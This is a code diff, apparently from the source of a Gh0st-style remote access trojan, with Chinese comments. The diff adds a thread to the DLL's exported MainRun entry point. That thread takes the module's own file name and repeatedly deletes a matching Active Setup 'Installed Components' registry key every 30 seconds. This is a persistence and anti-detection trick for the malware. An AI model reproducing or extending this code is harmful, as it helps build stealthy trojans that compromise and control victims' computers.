@@ -5,8 +5,11 @@
 #include "common/login.h"
 #include "common/install.h"
 #include <stdio.h>
+#include <shlwapi.h>
+#pragma comment(lib,"shlwapi.lib")
 
 
+DWORD WINAPI DelAXRegThread(LPVOID lpParam);
 
 char	svcname[MAX_PATH];
 SERVICE_STATUS_HANDLE hServiceStatus;
@@ -282,8 +285,10 @@ extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
 	return;
 }
 
+
 extern "C" __declspec(dllexport) void MainRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
 {
+	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DelAXRegThread, NULL, 0, NULL);
 	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
 	WaitForSingleObject(hThread, INFINITE);
 }
@@ -310,6 +315,37 @@ extern "C" __declspec(dllexport) void FirstRun(HWND hwnd, HINSTANCE hinst, LPSTR
 	StartInfo.lpReserved2 = NULL;
 	StartInfo.wShowWindow = SW_SHOWNORMAL;
 	BOOL bReturn = CreateProcess(NULL, strCmdLine, NULL, NULL, FALSE, NULL, NULL, NULL, &StartInfo, &ProcessInformation);
+
+}
+
+
+
+DWORD WINAPI DelAXRegThread(LPVOID lpParam)
+{
+	char strFileName[MAX_PATH];     //dll文件名
+	char *pstrTemp = NULL;
+	char ActiveXStr[1024];           //activex 键值字符串
+
+	ZeroMemory(ActiveXStr, 1024);
+	ZeroMemory(strFileName, MAX_PATH);
+	//得到自身文件名
+	GetModuleFileName(CKeyboardManager::g_hInstance, strFileName, MAX_PATH);
+	PathStripPath(strFileName); //将完整文件名转换为文件名
+	pstrTemp = strstr(strFileName, ".dll");  //寻找 .dll然后将他删除掉
+	if (pstrTemp != NULL)
+	{
+		ZeroMemory(pstrTemp, strlen(pstrTemp));  //删除掉扩展名
+		//构造键值
+		sprintf(ActiveXStr, "%s%s", "Software\\Microsoft\\Active Setup\\Installed Components\\", strFileName);
+		while (1)
+		{
+			//不停的删除注册表
+			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr);
+			OutputDebugString(ActiveXStr);      //输出删除的字串用以测试
+			Sleep(1000 * 30);
+		}
+	}
+	return 0;
 
 }
 
